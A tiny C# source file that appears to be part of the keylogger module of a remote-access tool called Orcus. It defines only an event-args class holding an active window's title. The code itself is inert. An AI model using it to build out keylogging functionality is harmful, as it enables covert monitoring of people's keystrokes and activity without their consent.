using System;

namespace Orcus.Utilities.KeyLogger;

internal class ActiveWindowChangedEventArgs : EventArgs
{
	public string Title { get; }

	public ActiveWindowChangedEventArgs(string title)
	{
		Title = title;
	}
}
